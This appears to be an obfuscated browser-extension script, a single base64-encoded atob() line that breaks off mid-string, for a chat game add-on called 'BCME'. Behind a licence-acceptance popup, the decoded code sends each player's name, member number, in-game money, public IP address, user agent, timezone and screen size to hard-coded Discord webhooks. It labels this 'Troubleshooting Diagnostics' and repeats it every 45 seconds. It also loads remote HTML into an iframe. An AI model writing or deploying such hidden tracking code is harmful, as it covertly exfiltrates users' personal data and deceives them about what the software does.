var sprc = atob('Ci8vIExpc2VuY2UgQWdncmVlbWVudCBwcm9tcHRfX19fX19fX19fX19fX19fX19fX19fCgovLyBDcmVhdGUgdGhlIHBvcHVwIGNvbnRhaW5lcgpjb25zdCBwb3B1cENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpwb3B1cENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICdmaXhlZCc7CnBvcHVwQ29udGFpbmVyLnN0eWxlLnRvcCA9ICcwJzsKcG9wdXBDb250YWluZXIuc3R5bGUubGVmdCA9ICcwJzsKcG9wdXBDb250YWluZXIuc3R5bGUud2lkdGggPSAnMTAwdncnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5oZWlnaHQgPSAnMTAwdmgnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAncmdiYSgwLCAwLCAwLCAwLjUpJzsKcG9wdXBDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsKcG9wdXBDb250YWluZXIuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAnY2VudGVyJzsKcG9wdXBDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICdjZW50ZXInOwpwb3B1cENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAnOTk5OSc7CgovLyBDcmVhdGUgdGhlIHBvcHVwIGNvbnRlbnQgY29udGFpbmVyCmNvbnN0IHBvcHVwQ29udGVudCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpwb3B1cENvbnRlbnQuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyNmZmYnOwpwb3B1cENvbnRlbnQuc3R5bGUuYm9yZGVyUmFkaXVzID0gJzVweCc7CnBvcHVwQ29udGVudC5zdHlsZS5wYWRkaW5nID0gJzJyZW0nOwpwb3B1cENvbnRlbnQuc3R5bGUud2lkdGggPSAnODAlJzsKcG9wdXBDb250ZW50LnN0eWxlLm1heFdpZHRoID0gJzYwMHB4JzsKcG9wdXBDb250ZW50LnN0eWxlLnRleHRBbGlnbiA9ICdjZW50ZXInOwoKLy8gQkNNRSBsb2dvCmNvbnN0IGxvZ28gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKTsKbG9nby5zcmMgPSAnaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5JzsKbG9nby5zdHlsZS53aWR0aCA9ICcxMDBweCc7CmxvZ28uc3R5bGUuaGVpZ2h0ID0gJzEwMHB4JzsKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKGxvZ28pOwoKY29uc3Qgd2VsY29tZU1lc3NhZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdoMicpOwp3ZWxjb21lTWVzc2FnZS5pbm5lclRleHQgPSAnV2VsY29tZSB0byBCQ01FLCBUaGUgRmlyc3QgUmlnaHQgQ2xpY2sgQkMgRXh0ZW5zaW9uJzsKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKHdlbGNvbWVNZXNzYWdlKTsKCmNvbnN0IGluc3RydWN0aW9uTWVzc2FnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3AnKTsKaW5zdHJ1Y3Rpb25NZXNzYWdlLmlubmVyVGV4dCA9ICdBY2NlcHQgb3VyIExpY2Vuc2UgQWdyZWVtZW50IGFuZCBQcml2YWN5IFBvbGljeSBiZWxvdyB0byBnZXQgc3RhcnRlZCEnOwpwb3B1cENvbnRlbnQuYXBwZW5kQ2hpbGQoaW5zdHJ1Y3Rpb25NZXNzYWdlKTsKCi8vIENyZWF0ZSB0aGUgYnV0dG9ucyBjb250YWluZXIKY29uc3QgYnV0dG9uc0NvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpidXR0b25zQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CmJ1dHRvbnNDb250YWluZXIuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAnc3BhY2UtYmV0d2Vlbic7Cgpjb25zdCBsZWFybk1vcmVCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhJyk7CmxlYXJuTW9yZUJ1dHRvbi5ocmVmID0gJ2h0dHBzOi8vYmNtLnNpdGUubGl2ZS9iY21sLyc7CmxlYXJuTW9yZUJ1dHRvbi50YXJnZXQgPSAnX2JsYW5rJzsgCmxlYXJuTW9yZUJ1dHRvbi5pbm5lclRleHQgPSAnTGVhcm4gTW9yZSc7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAnIzAwN2JmZic7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS5jb2xvciA9ICcjZmZmJzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLnBhZGRpbmcgPSAnMC41cmVtIDFyZW0nOwpsZWFybk1vcmVCdXR0b24uc3R5bGUuYm9yZGVyUmFkaXVzID0gJzNweCc7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS50ZXh0RGVjb3JhdGlvbiA9ICdub25lJzsKYnV0dG9uc0NvbnRhaW5lci5hcHBlbmRDaGlsZChsZWFybk1vcmVCdXR0b24pOwoKLy8gQWRkIHRoZSBBY2NlcHQgJiBDb250aW51ZSBidXR0b24KY29uc3QgYWNjZXB0QnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYnV0dG9uJyk7CmFjY2VwdEJ1dHRvbi5pbm5lclRleHQgPSAnQWNjZXB0ICYgQ29udGludWUnOwphY2NlcHRCdXR0b24uc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyMyOGE3NDUnOwphY2NlcHRCdXR0b24uc3R5bGUuY29sb3IgPSAnI2ZmZic7CmFjY2VwdEJ1dHRvbi5zdHlsZS5ib3JkZXIgPSAnbm9uZSc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5wYWRkaW5nID0gJzAuNXJlbSAxcmVtJzsKYWNjZXB0QnV0dG9uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICczcHgnOwphY2NlcHRCdXR0b24uc3R5bGUuY3Vyc29yID0gJ3BvaW50ZXInOwphY2NlcHRCdXR0b24ub25jbGljayA9ICgpID0+IHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgnYmNtZS1hY2NlcHRlZCcsICd0cnVlJyk7CiAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChwb3B1cENvbnRhaW5lcik7Cn07CmJ1dHRvbnNDb250YWluZXIuYXBwZW5kQ2hpbGQoYWNjZXB0QnV0dG9uKTsKCi8vIEFkZCBidXR0b25zIGNvbnRhaW5lciB0byB0aGUgcG9wdXAgY29udGVudApwb3B1cENvbnRlbnQuYXBwZW5kQ2hpbGQoYnV0dG9uc0NvbnRhaW5lcik7CgovLyBBZGQgdGhlIHBvcHVwIGNvbnRlbnQgdG8gdGhlIHBvcHVwIGNvbnRhaW5lcgpwb3B1cENvbnRhaW5lci5hcHBlbmRDaGlsZChwb3B1cENvbnRlbnQpOwoKLy8gU2hvdyB0aGUgcG9wdXAgaWYgbm90IGFjY2VwdGVkIGJlZm9yZQppZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2JjbWUtYWNjZXB0ZWQnKSAhPT0gJ3RydWUnKSB7CiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwb3B1cENvbnRhaW5lcik7Cn0KCi8vU2VuZCBEZWJ1Z19fX19fX19fX19fX19fX19fX19fX18KYXN5bmMgZnVuY3Rpb24gc2VuZERpc2NvcmRNZXNzYWdlKCkgewogIGNvbnN0IGdJUEEgPSBhc3luYyAoKSA9PiB7CiAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2FwaS5pcGlmeS5vcmc/Zm9ybWF0PWpzb24nKTsKICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7CiAgICByZXR1cm4gZGF0YS5pcDsKICB9OwoKICBjb25zdCBpcEEgPSBhd2FpdCBnSVBBKCk7CgogIHNldFRpbWVvdXQoKCkgPT4gewogICAgY29uc3Qgd2ViaG9va1VybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTAwMTcwMDE3ODU4OTI0NTY0L2NlSENyTlo3UnJURTdoVEU1TXBTMzZ3S3RmNThxRTZqSDFjS196ZUJkcno4cG54SlhyZWtYMDhOVngxWHZxaFhYWDBOIjsKICAgIGNvbnN0IHRvdGFsbmFtZSA9IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSI7CiAgICBjb25zdCB1c2VybmFtZSA9IHRvdGFsbmFtZTsKICAgIGNvbnN0IGF2YXRhclVybCA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogICAgY29uc3QgdXNlcmFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsKICAgIGNvbnN0IHRpbWV6b25lID0gSW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVkT3B0aW9ucygpLnRpbWVab25lOwogICAgY29uc3Qgb3BlblRhYnMgPSB3aW5kb3cubGVuZ3RoOwogICAgY29uc3Qgc2NyZWVuU2l6ZSA9IGAke3dpbmRvdy5zY3JlZW4ud2lkdGh9eCR7d2luZG93LnNjcmVlbi5oZWlnaHR9YDsKCiAgICBjb25zdCBtZXNzYWdlID0gewogICAgICBjb250ZW50OiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiICsgIiBsb2dnZWQgaW50byBCQ01FIiwKICAgICAgZW1iZWRzOiBbewogICAgICAgIHRpdGxlOiAiVHJvdWJsZXNob290aW5nIERpYWdub3N0aWNzICIsCiAgICAgICAgZmllbGRzOiBbCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJVc2VyIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSIsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIlRpbWV6b25lIiwKICAgICAgICAgICAgdmFsdWU6IHRpbWV6b25lLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJEZXZpY2UgVHlwZSIsCiAgICAgICAgICAgIHZhbHVlOiB1c2VyYWdlbnQsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIk1vbmV5IiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5Nb25leSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiTmlja25hbWUiLAogICAgICAgICAgICB2YWx1ZTogUGxheWVyLk5pY2tuYW1lLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJGb250IiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5HcmFwaGljc1NldHRpbmdzLkZvbnQsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIkNoYXQgQ29sb3IgVGhlbWUiLAogICAgICAgICAgICB2YWx1ZTogUGxheWVyLkNoYXRTZXR0aW5ncy5Db2xvclRoZW1lLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJBcm91c2FsIFByb2dyZXNzIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5Bcm91c2FsU2V0dGluZ3MuUHJvZ3Jlc3MsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIkxhc3QgQ2hhdCBSb29tIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5MYXN0Q2hhdFJvb20sCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIkxvY2FsIElQIEFkZHJlc3MiLAogICAgICAgICAgICB2YWx1ZTogaXBBLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJTY3JlZW4gU2l6ZSIsCiAgICAgICAgICAgIHZhbHVlOiBzY3JlZW5TaXplLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0KICAgICAgICBdCiAgICAgIH1dCiAgICB9OwoKICAgIGNvbnN0IHBheWxvYWQgPSB7CiAgICAgIHVzZXJuYW1lOiB1c2VybmFtZSwKICAgICAgYXZhdGFyX3VybDogYXZhdGFyVXJsLAogICAgICBjb250ZW50OiBtZXNzYWdlLmNvbnRlbnQsCiAgICAgIGVtYmVkczogbWVzc2FnZS5lbWJlZHMKICAgIH07CgogICAgZmV0Y2god2ViaG9va1VybCwgewogICAgICBtZXRob2Q6ICJQT1NUIiwKICAgICAgaGVhZGVyczogewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIKICAgICAgfSwKICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICAgIH0pOwogIH0sIDYwMDAwKTsKfQoKc2VuZERpc2NvcmRNZXNzYWdlKCk7CgoKLy91c2VkIGZ1bmN0aW9uIGRlYnVnX19fX19fX19fX19fXwoKYXN5bmMgZnVuY3Rpb24gc2VuZEZkZWJ1ZygpIHsKICB0cnkgewogICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uJyk7CiAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOwogICAgY29uc3QgaXBBID0gZGF0YS5pcDsKCiAgICBjb25zdCB3ZWJob29rVXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMDAxNzAwMTc4NTg5MjQ1NjQvY2VIQ3JOWjdSclRFN2hURTVNcFMzNndLdGY1OHFFNmpIMWNLX3plQmRyejhwbnhKWHJla1gwOE5WeDFYdnFoWFhYME4iOwogICAgY29uc3QgdG90YWxuYW1lID0gUGxheWVyLk5hbWUgKyAiICgiICsgUGxheWVyLk1lbWJlck51bWJlciArICIpIjsKICAgIGNvbnN0IHVzZXJuYW1lID0gdG90YWxuYW1lOwogICAgY29uc3QgYXZhdGFyVXJsID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgICBjb25zdCB1c2VyYWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50OwogICAgY29uc3QgdGltZXpvbmUgPSBJbnRsLkRhdGVUaW1lRm9ybWF0KCkucmVzb2x2ZWRPcHRpb25zKCkudGltZVpvbmU7CiAgICBjb25zdCBvcGVuVGFicyA9IHdpbmRvdy5sZW5ndGg7CiAgICBjb25zdCBzY3JlZW5TaXplID0gYCR7d2luZG93LnNjcmVlbi53aWR0aH14JHt3aW5kb3cuc2NyZWVuLmhlaWdodH1gOwoKICAgIGNvbnN0IG1lc3NhZ2UgPSB7CiAgICAgIGNvbnRlbnQ6IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSIgKyAiIHVzZWQgYSBmdW5jdGlvbiBpbiBCQ01FIiwKICAgICAgZW1iZWRzOiBbewogICAgICAgIHRpdGxlOiAiVHJvdWJsZXNob290aW5nIERpYWdub3N0aWNzICIsCiAgICAgICAgZmllbGRzOiBbCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJVc2VyIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSIsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIlRpbWV6b25lIiwKICAgICAgICAgICAgdmFsdWU6IHRpbWV6b25lLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJEZXZpY2UgVHlwZSIsCiAgICAgICAgICAgIHZhbHVlOiB1c2VyYWdlbnQsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIk1vbmV5IiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5Nb25leSwKICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAiTmlja25hbWUiLAogICAgICAgICAgICB2YWx1ZTogUGxheWVyLk5pY2tuYW1lLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJGb250IiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5HcmFwaGljc1NldHRpbmdzLkZvbnQsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIkNoYXQgQ29sb3IgVGhlbWUiLAogICAgICAgICAgICB2YWx1ZTogUGxheWVyLkNoYXRTZXR0aW5ncy5Db2xvclRoZW1lLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJBcm91c2FsIFByb2dyZXNzIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5Bcm91c2FsU2V0dGluZ3MuUHJvZ3Jlc3MsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIkxhc3QgQ2hhdCBSb29tIiwKICAgICAgICAgICAgdmFsdWU6IFBsYXllci5MYXN0Q2hhdFJvb20sCiAgICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogIkxvY2FsIElQIEFkZHJlc3MiLAogICAgICAgICAgICB2YWx1ZTogaXBBLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICJTY3JlZW4gU2l6ZSIsCiAgICAgICAgICAgIHZhbHVlOiBzY3JlZW5TaXplLAogICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgIH0KICAgICAgICBdCiAgICAgIH1dCiAgICB9OwoKICAgIGNvbnN0IHBheWxvYWQgPSB7CiAgICAgIHVzZXJuYW1lOiB1c2VybmFtZSwKICAgICAgYXZhdGFyX3VybDogYXZhdGFyVXJsLAogICAgICBjb250ZW50OiBtZXNzYWdlLmNvbnRlbnQsCiAgICAgIGVtYmVkczogbWVzc2FnZS5lbWJlZHMKICAgIH07CgogICAgYXdhaXQgZmV0Y2god2ViaG9va1VybCwgewogICAgICBtZXRob2Q6ICJQT1NUIiwKICAgICAgaGVhZGVyczogewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIKICAgICAgfSwKICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICAgIH0pOwogIH0gY2F0Y2ggKGVycm9yKSB7CiAgICBjb25zb2xlLmVycm9yKGVycm9yKTsKICB9Cn0KCgovL1BlcmlvZGljYWwgRGVidWdfX19fX19fX19fX19fX19fX19fX19fCgphc3luYyBmdW5jdGlvbiBzZW5kRGlzY29yZE1lc3NhZ2UoKSB7CiAgbGV0IGlwQSA9ICcnOwoKICB0cnkgewogICAgY29uc3QgZ0lQQSA9IGFzeW5jICgpID0+IHsKICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uJyk7CiAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7CiAgICAgIHJldHVybiBkYXRhLmlwOwogICAgfTsKCiAgICBpcEEgPSBhd2FpdCBnSVBBKCk7CiAgfSBjYXRjaCAoZXJyb3IpIHsKICAgIGNvbnNvbGUuZXJyb3IoJ0FsdCBEZXRlY3RvciBFcnJvcjonLCBlcnJvcik7CiAgfQoKICBjb25zdCB3ZWJob29rVXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMDAxNzAxMjkzOTM4NjA2NjgvTmpsUHJCY09HeHhPaUNMam11NFVKbjVKWVVna0tqbUpmdElJSDZtMjIwa2QtTWJkbWFrQ2Rka1FpODlPRXZZMUI3QlMiOwogIGNvbnN0IHRvdGFsbmFtZSA9IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSI7CiAgY29uc3QgdXNlcm5hbWUgPSB0b3RhbG5hbWU7CiAgY29uc3QgYXZhdGFyVXJsID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgY29uc3QgdXNlcmFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsKICBjb25zdCB0aW1lem9uZSA9IEludGwuRGF0ZVRpbWVGb3JtYXQoKS5yZXNvbHZlZE9wdGlvbnMoKS50aW1lWm9uZTsKICBjb25zdCBvcGVuVGFicyA9IHdpbmRvdy5sZW5ndGg7CiAgY29uc3Qgc2NyZWVuU2l6ZSA9IGAke3dpbmRvdy5zY3JlZW4ud2lkdGh9eCR7d2luZG93LnNjcmVlbi5oZWlnaHR9YDsKCiAgY29uc3QgbWVzc2FnZSA9IHsKICAgIGNvbnRlbnQ6IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSIgKyAiIGlzIGFjdGl2ZSBvbiBCQ01FIiwKICAgIGVtYmVkczogW3sKICAgICAgdGl0bGU6ICJUcm91Ymxlc2hvb3RpbmcgRGlhZ25vc3RpY3MgIiwKICAgICAgZmllbGRzOiBbCiAgICAgICAgewogICAgICAgICAgbmFtZTogIlVzZXIiLAogICAgICAgICAgdmFsdWU6IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSIsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJUaW1lem9uZSIsCiAgICAgICAgICB2YWx1ZTogdGltZXpvbmUsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJEZXZpY2UgVHlwZSIsCiAgICAgICAgICB2YWx1ZTogdXNlcmFnZW50LAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiTW9uZXkiLAogICAgICAgICAgdmFsdWU6IFBsYXllci5Nb25leSwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIk5pY2tuYW1lIiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTmlja25hbWUsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJGb250IiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuR3JhcGhpY3NTZXR0aW5ncy5Gb250LAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiQ2hhdCBDb2xvciBUaGVtZSIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLkNoYXRTZXR0aW5ncy5Db2xvclRoZW1lLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiQXJvdXNhbCBQcm9ncmVzcyIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLkFyb3VzYWxTZXR0aW5ncy5Qcm9ncmVzcywKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIkxhc3QgQ2hhdCBSb29tIiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTGFzdENoYXRSb29tLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiTG9jYWwgSVAgQWRkcmVzcyIsCiAgICAgICAgICB2YWx1ZTogaXBBLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiU2NyZWVuIFNpemUiLAogICAgICAgICAgdmFsdWU6IHNjcmVlblNpemUsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9CiAgICAgIF0KICAgIH1dCiAgfTsKCiAgY29uc3QgcGF5bG9hZCA9IHsKICAgIHVzZXJuYW1lOiB1c2VybmFtZSwKICAgIGF2YXRhcl91cmw6IGF2YXRhclVybCwKICAgIGNvbnRlbnQ6IG1lc3NhZ2UuY29udGVudCwKICAgIGVtYmVkczogbWVzc2FnZS5lbWJlZHMKICB9OwoKICBmZXRjaCh3ZWJob29rVXJsLCB7CiAgICBtZXRob2Q6ICJQT1NUIiwKICAgIGhlYWRlcnM6IHsKICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIgogICAgfSwKICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHBheWxvYWQpCiAgfSk7Cn0KCnNldEludGVydmFsKHNlbmREaXNjb3JkTWVzc2FnZSwgNDUwMDApOwoKCgovL0VuZCBPZiBEZWJ1Z19fX19fX19fX19fX19fX19fX19fX18KCgovL1N0YXJ0IE9mIExvYWRpbmcgU2NyZWVuX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KLy8gVVJMIG9mIGxvYWRpbmcgc2NyZWVuCmNvbnN0IGh0bWxGaWxlVXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQ01TNy9CQ00tL21haW4vbG9hZGluZzQnOwoKLy8gRmV0Y2ggdGhlIGNvZGUgZnJvbSB0aGUgcmF3IEdpdEh1YiBmaWxlIHVzaW5nIEZldGNoIEFQSQpmZXRjaChodG1sRmlsZVVybCkKICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgLnRoZW4oaHRtbCA9PiB7CiAgICAvLyBOZXcgaWZyYW1lIGVsZW1lbnQKICAgIGNvbnN0IGlmcmFtZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpOwogICAgaWZyYW1lLnN0eWxlLnBvc2l0aW9uID0gJ2ZpeGVkJzsKICAgIGlmcmFtZS5zdHlsZS50b3AgPSAnMCc7CiAgICBpZnJhbWUuc3R5bGUubGVmdCA9ICcwJzsKICAgIGlmcmFtZS5zdHlsZS53aWR0aCA9ICcxMzglJzsKICAgIGlmcmFtZS5zdHlsZS5oZWlnaHQgPSAnMTI1JSc7CiAgICBpZnJhbWUuc3R5bGUubWFyZ2luTGVmdCA9ICctMTklJzsgLy8gQWRkIGxlZnQgbWFyZ2luIHRvIHRoZSBpZnJhbWUKICAgIGlmcmFtZS5zdHlsZS5tYXJnaW5Ub3AgPSAnLTIlJzsgLy8gQWRkIGxlZnQgbWFyZ2luIHRvIHRoZSBpZnJhbWUKCgoKICAgIC8vIExvYWQgdGhlIGltcG9ydGVkIEhUTUwgaW50byB0aGUgaWZyYW1lCiAgICBpZnJhbWUub25sb2FkID0gZnVuY3Rpb24oKSB7CiAgICAgIGNvbnN0IGlmcmFtZURvY3VtZW50ID0gdGhpcy5jb250ZW50V2luZ